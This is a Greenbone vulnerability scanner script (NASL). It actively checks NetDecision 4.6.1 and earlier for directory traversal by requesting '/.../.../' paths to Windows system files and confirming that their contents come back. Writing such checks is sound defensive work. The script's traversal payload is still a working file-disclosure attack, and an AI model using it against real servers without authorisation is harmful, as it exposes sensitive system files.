# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802618");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2012-03-09 16:16:16 +0530 (Fri, 09 Mar 2012)");

  script_tag(name:"qod_type", value:"remote_app");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("NetDecision <= 4.6.1 Multiple Directory Traversal Vulnerabilities - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("Web Servers");
  script_dependencies("gb_get_http_banner.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80, 8087, 8090);
  script_mandatory_keys("NetDecision-HTTP-Server/banner");

  script_tag(name:"summary", value:"NetDecision is prone to multiple directory traversal
  vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"Multiple flaws are due to an input validation error in the
  NOCVision server and Traffic Grapher server when processing web requests can be exploited to
  disclose arbitrary files via directory traversal attacks.");

  script_tag(name:"impact", value:"Successful exploitation may allow an attacker to obtain
  sensitive information, which can lead to launching further attacks.");

  script_tag(name:"affected", value:"NetMechanica NetDecision version 4.6.1 and prior.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General
  solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one.");

  script_xref(name:"URL", value:"http://secunia.com/advisories/48269");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/52327");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/73714");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/73715");
  script_xref(name:"URL", value:"http://aluigi.altervista.org/adv/netdecision_1-adv.txt");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("traversal_func.inc");
include("os_func.inc");
include("port_service_func.inc");

ports = http_get_ports(default_port_list: make_list(80, 8087, 8090));
files = traversal_files("windows");

foreach port (ports) {
  banner = http_get_remote_headers(port: port);
  if (!banner || "Server: NetDecision-HTTP-Server" >!< banner)
    continue;

  foreach file (keys(files)) {
    path = "/.../.../.../.../.../.../.../.../" + files[file];

    if (http_vuln_check(port: port, url: path, pattern: file, check_header: TRUE)) {
      report = http_report_vuln_url(port: port, url: path);
      security_message(port: port, data: report);
      exit(0);
    }
  }
}

exit(99);
